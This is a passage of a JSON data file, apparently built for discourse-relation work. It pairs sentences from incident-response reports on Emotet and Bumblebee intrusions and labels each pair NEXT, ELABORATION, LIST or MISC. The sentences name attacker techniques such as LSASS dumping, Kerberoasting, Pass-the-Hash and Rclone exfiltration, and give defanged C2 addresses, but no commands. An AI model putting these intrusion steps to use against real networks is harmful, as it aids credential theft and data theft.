        "S2": "On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.",
        "S2": "At 29 hours from initial access, the threat actors began their first lateral movement.",
        "relation": "NEXT"
    },
    {
        "S1": "Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.",
        "S2": "Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast.",
        "relation": "NEXT"
    },
    {
        "S1": "Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS.",
        "S2": "The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.",
        "relation": "MISC"
    },
    {
        "S1": "Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast.",
        "S2": "The threat actor gained access to the environment after a user opened an Excel document and enabled macros.",
        "relation": "MISC"
    },
    {
        "S1": "At 29 hours from initial access, the threat actors began their first lateral movement.",
        "S2": "From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.",
        "relation": "NEXT"
    },
    {
        "S1": "This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.",
        "S2": "Use of Cobalt Strike\u2019s Get-System module was also apparent via the logs.",
        "relation": "MISC"
    },
    {
        "S1": "From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.",
        "S2": "The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.",
        "relation": "NEXT"
    },
    {
        "S1": "Pass-the-Hash behavior was observed targeting several accounts on the lateral host.",
        "S2": "During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.",
        "relation": "MISC"
    },
    {
        "S1": "Use of Cobalt Strike\u2019s Get-System module was also apparent via the logs.",
        "S2": "Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.",
        "relation": "NEXT"
    },
    {
        "S1": "Use of Cobalt Strike\u2019s Get-System module was also apparent via the logs.",
        "S2": "At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.",
        "S2": "At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.",
        "S2": "Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.",
        "S2": "They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.",
        "relation": "NEXT"
    },
    {
        "S1": "At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.",
        "S2": "They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.",
        "relation": "LIST"
    },
    {
        "S1": "At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.",
        "S2": "During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.",
        "relation": "MISC"
    },
    {
        "S1": "After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera\u2013for an additional means of persistence and command and control.",
        "S2": "They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera\u2013for an additional means of persistence and command and control.",
        "S2": "They returned the next day, at the same time as the previous day, and picked up where they left off.",
        "relation": "NEXT"
    },
    {
        "S1": "During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.",
        "S2": "On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server.",
        "relation": "NEXT"
    },
    {
        "S1": "During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.",
        "S2": "Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.",
        "S2": "Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter \u2013ignore-existing from two different hosts on the network.",
        "relation": "NEXT"
    },
    {
        "S1": "Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter \u2013ignore-existing from two different hosts on the network.",
        "S2": "This activity was also visible on the network via Zeek logs showing the SMB share connection activity.",
        "relation": "MISC"
    },
    {
        "S1": "Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter \u2013ignore-existing from two different hosts on the network.",
        "S2": "On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.",
        "S2": "The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.",
        "relation": "MISC"
    },
    {
        "S1": "Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.",
        "S2": "From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.",
        "relation": "MISC"
    },
    {
        "S1": "On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server.",
        "S2": "On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.",
        "relation": "MISC"
    },
    {
        "S1": "On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server.",
        "S2": "This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken.",
        "relation": "MISC"
    },
    {
        "S1": "This was the last activity we observed from this group.",
        "S2": "The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken.",
        "S2": "This registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor gained access to the environment after a user opened an Excel document and enabled macros.",
        "S2": "The execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll .",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor gained access to the environment after a user opened an Excel document and enabled macros.",
        "S2": "Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "The document came in via email in the form of a zip file which included an xls file.",
        "S2": "The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.",
        "S2": "The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.",
        "relation": "NEXT"
    },
    {
        "S1": "Sysmon showing Emotet starting the Cobalt Strike executable.",
        "S2": "The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.",
        "relation": "MISC"
    },
    {
        "S1": "Sysmon showing Emotet starting the Cobalt Strike executable.",
        "S2": "Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "Sysmon showing Emotet starting the Cobalt Strike executable.",
        "S2": "Here, the tool is used with a process dump of the executable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.",
        "S2": "Emotet has for some time been used as an initial access broker for various intrusions; however, some Emotet infections get tasked with continuing the delivery of new campaigns.",
        "relation": "MISC"
    },
    {
        "S1": "The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.",
        "S2": "Process injection was observed during the intrusion by both Emotet and Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "This registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion.",
        "S2": "Process injection was observed during the intrusion by both Emotet and Cobalt Strike.",
        "relation": "LIST"
    },
    {
        "S1": "Use of Cobalt Strike\u2019s Get-System named pipe technique was observed on the Domain Controller and other hosts to elevate to System privileges.",
        "S2": "The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller.",
        "relation": "LIST"
    },
    {
        "S1": "Process injection was observed during the intrusion by both Emotet and Cobalt Strike.",
        "S2": "Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process.",
        "relation": "LIST"
    },
    {
        "S1": "Process injection was observed during the intrusion by both Emotet and Cobalt Strike.",
        "S2": "On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.",
        "relation": "MISC"
    },
    {
        "S1": "Emotet injected multiple times into svchost to execute certain functions, including discovery commands.",
        "S2": "On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process.",
        "S2": "Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule.",
        "S2": "Data observed using sysmon event id 10 shows the use of the SearchIndexer process, similar to behavior observed in a prior case, followed by known Cobalt Strike malleable profile named pipes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.",
        "S2": "Shortly after the credential dump using the SearchIndexer process, the Cobalt Strike process ran Invoke-Kerberoast looking for roastable accounts within the organization.",
        "relation": "NEXT"
    },
    {
        "S1": "From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.",
        "S2": "On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.",
        "relation": "MISC"
    },
    {
        "S1": "We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.",
        "S2": "On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host\u2019s Windows domain.",
        "relation": "MISC"
    },
    {
        "S1": "We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.",
        "S2": "We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons.",
        "relation": "LIST"
    },
    {
        "S1": "On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.",
        "S2": "The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.",
        "relation": "NEXT"
    },
    {
        "S1": "On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host\u2019s Windows domain.",
        "S2": "Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller.",
        "S2": "Using the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat.",
        "relation": "MISC"
    },
    {
        "S1": "The contents of the script are below:",
        "S2": "The batch file contained one line, which pinged a list of servers (servers.txt).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat.",
        "S2": "Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.",
        "S2": "The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.",
        "relation": "MISC"
    },
    {
        "S1": "The Cobalt Strike jump psexec (Run service EXE on the remote host) produced a 7045 System Windows event on remote hosts.",
        "S2": "The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.",
        "relation": "MISC"
    },
    {
        "S1": "The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.",
        "S2": "Emotet, later on, deployed Cobalt Strike for additional functionality.",
        "relation": "MISC"
    },
    {
        "S1": "We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons.",
        "S2": "We observed the below logs being generated on the source host and domain controller that indicate the use of PTH.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons.",
        "S2": "We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons.",
        "S2": "Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Emotet, later on, deployed Cobalt Strike for additional functionality.",
        "S2": "We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion.",
        "S2": "In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.",
        "relation": "MISC"
    },
    {
        "S1": "We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.",
        "S2": "In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.",
        "relation": "MISC"
    },
    {
        "S1": "This activity was also visible on the network via Zeek logs showing the SMB share connection activity.",
        "S2": "In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.",
        "relation": "MISC"
    },
    {
        "S1": "In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.",
        "S2": "The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.",
        "S2": "We did not see any further activity but we believe if given enough time, this would have ended with domain wide ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "The Emotet mailer started roughly once each day during the intrusion.",
        "S2": "The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this intrusion, the threat actors operated in an environment over an 11 day dwell period.",
        "S2": "From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.",
        "relation": "MISC"
    },
    {
        "S1": "The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file.",
        "S2": "We assess based on the level of access and discovery activity from the final day, the likely final actions would have been a domain wide ransom deployment.",
        "relation": "NEXT"
    },
    {
        "S1": "The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file.",
        "S2": "The threat actor then deployed AnyDesk, which was the only observed persistence mechanism used during the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory.",
        "S2": "From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.",
        "relation": "NEXT"
    },
    {
        "S1": "At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.",
        "S2": "The successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques.",
        "relation": "MISC"
    },
    {
        "S1": "This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).",
        "S2": "The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.",
        "relation": "MISC"
    },
    {
        "S1": "From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.",
        "S2": "Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.",
        "relation": "NEXT"
    },
    {
        "S1": "From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.",
        "S2": "After this activity, the threat actors went silent.",
        "relation": "NEXT"
    },
    {
        "S1": "Four hours after initial access, the threat actor used RDP to access a server using the local Administrator account.",
        "S2": "Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then deployed AnyDesk, which was the only observed persistence mechanism used during the intrusion.",
        "S2": "On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then started Active Directory discovery using Adfind.",
        "S2": "Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then started Active Directory discovery using Adfind.",
        "S2": "AdFind was used again as well.",
        "relation": "NEXT"
    },
    {
        "S1": "Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.",
        "S2": "This library seems to be a custom tool developed to assist threat actors with Windows local privilege escalation enumeration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.",
        "S2": "After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.",
        "relation": "NEXT"
    },
    {
        "S1": "The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.",
        "S2": "At this point, the actors appeared to be searching for more access then they currently had.",
        "relation": "MISC"
    },
    {
        "S1": "The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.",
        "S2": "We observed this beacon performing various techniques (process injections in svchost process via CreateRemoteThread, default named pipes, etc.)",
        "relation": "MISC"
    },
    {
        "S1": "The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.",
        "S2": "After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.",
        "relation": "NEXT"
    },
    {
        "S1": "AdFind was used again as well.",
        "S2": "AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.",
        "relation": "NEXT"
    },
    {
        "S1": "They then used remote services to execute Procdump, which was used to dump LSASS.",
        "S2": "On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.",
        "S2": "The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.",
        "relation": "MISC"
    },
    {
        "S1": "On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.",
        "S2": "We assess based on the level of access and discovery activity from the final day, the likely final actions would have been a domain wide ransom deployment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.",
        "S2": "This service account had a weak password, which was most likely cracked offline after being kerberoasted earlier in the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.",
        "S2": "After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.",
        "S2": "Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",
        "S2": "Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc beacon:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",
        "S2": "Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.",
        "relation": "NEXT"
    },
    {
        "S1": "AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.",
        "S2": "Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server:",
        "relation": "MISC"
    },
    {
        "S1": "Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.",
        "S2": "The threat actors were then evicted from the environment before any final actions could be taken.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.",
        "S2": "The parent process of this command was C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc , a process where Cobalt Strike was injected into:",
        "relation": "MISC"
    },
    {
        "S1": "This service account had a weak password, which was most likely cracked offline after being kerberoasted earlier in the intrusion.",
        "S2": "The account used to perform this lateral movement was one of the kerberoasted service accounts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors were then evicted from the environment before any final actions could be taken.",
        "S2": "The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.",
        "relation": "MISC"
    },
    {
        "S1": "We assess based on the level of access and discovery activity from the final day, the likely final actions would have been a domain wide ransom deployment.",
        "S2": "A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender\u2019s Guide blog post.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.",
        "S2": "Running Eric Zimmerman\u2019s tool LECmd revealed additional details related to the threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.",
        "S2": "Right after the execution of Invoke-Kerberoast, DC logs show that multiple Kerberos Service Tickets were requested from the beachhead host, with ticket encryption type set to 0x17 (RC4) and ticket options to 0x40810000, for service accounts.",
        "relation": "NEXT"
    },
    {
        "S1": "Running Eric Zimmerman\u2019s tool LECmd revealed additional details related to the threat actors.",
        "S2": "We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.",
        "relation": "MISC"
    },
    {
        "S1": "The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into:",
        "S2": "As mentioned before in the lateral tool transfer section, threat actors remotely dropped the AnyDesk binary on a server from the beachhead:",
        "relation": "MISC"
    },
    {
        "S1": "The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory:",
        "S2": "Two CS C2 servers were used during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory:",
        "S2": "This payload can be deobfuscated using the following CyberChef recipe:",
        "relation": "MISC"
    },
    {
        "S1": "A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender\u2019s Guide blog post.",
        "S2": "A Yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts.",
        "relation": "MISC"
    },
    {
        "S1": "A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender\u2019s Guide blog post.",
        "S2": "We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.",
        "relation": "MISC"
    },
    {
        "S1": "A Yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts.",
        "S2": "Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server:",
        "relation": "MISC"
    },
    {
        "S1": "We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.",
        "S2": "Below are all the command lines run by the adversaries:",
        "relation": "MISC"
    },
    {
        "S1": "We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.",
        "S2": "Here is a Guide to Named Pipes and Hunting for Cobalt Strike Pipes from one of our contributors @svch0st.",
        "relation": "MISC"
    },
    {
        "S1": "The table below shows an example of ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process:",
        "S2": "Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc beacon:",
        "S2": "The ProcDump utility was executed on those workstations using the following command line:",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc beacon:",
        "S2": "Named pipes are commonly used by Cobalt Strike to perform various techniques.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc beacon:",
        "S2": "Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected:",
        "relation": "NEXT"
    },
    {
        "S1": "Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected:",
        "S2": "Around 3 hours later, one of the service accounts logged into one of the Domain Controllers from the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected:",
        "S2": "Right after the execution of Invoke-Kerberoast, DC logs show that multiple Kerberos Service Tickets were requested from the beachhead host, with ticket encryption type set to 0x17 (RC4) and ticket options to 0x40810000, for service accounts.",
        "relation": "NEXT"
    },
    {
        "S1": "Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected:",
        "S2": "As we have already observed in multiple cases, the threat actors enumerated the local administrators group and domain privileged (Enterprise and DAs) administrators groups mainly using net command:",
        "relation": "MISC"
    },
    {
        "S1": "Right after the execution of Invoke-Kerberoast, DC logs show that multiple Kerberos Service Tickets were requested from the beachhead host, with ticket encryption type set to 0x17 (RC4) and ticket options to 0x40810000, for service accounts.",
        "S2": "To enumerate Active Directory, the threat actors executed AdFind from the beachhead host, on three different occasions:",
        "relation": "MISC"
    },
    {
        "S1": "As we have already observed in multiple cases, the threat actors enumerated the local administrators group and domain privileged (Enterprise and DAs) administrators groups mainly using net command:",
        "S2": "The tool SeatBelt was used by the threat actors on a server in order to discover potential security misconfigurations.",
        "relation": "NEXT"
    },
    {
        "S1": "Invoke-ShareFinder is a PowerShell module which is part of PowerView.",
        "S2": "Because rundll32.exe executed PowerShell, we can see that rundll32.exe created the ShareFinder.txt output file in C:\\ProgramData\\.",
        "relation": "MISC"
    },
    {
        "S1": "Seatbelt is a C# project that performs a number of security oriented host-survey \u201csafety checks\u201d relevant from both offensive and defensive security perspectives.",
        "S2": "This is the first time we\u2019ve observed this tool.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The table below summarizes the capabilities of the tool:",
        "S2": "Threat actors executed this tool on patient 0 with low-level privileges multiple times, and again on a server with Administrator privileges.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server:",
        "S2": "Threat actors used the built-in Cobalt Strike jump psexec command to move laterally.",
        "relation": "MISC"
    },
    {
        "S1": "Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server:",
        "S2": "The graph below shows beaconing activity over time, we can notice the continuous usage of the first C2 server (45.153.243[.]142/fuvataren[.]com) from day 1 and the second C2 server (108.62.12[.]174/dofixifa[.]co) during the last day of intrusion only (day 11):",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors also transferred ProcDump from the beachhead to multiple workstations:",
        "S2": "Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts.",
        "relation": "MISC"
    },
    {
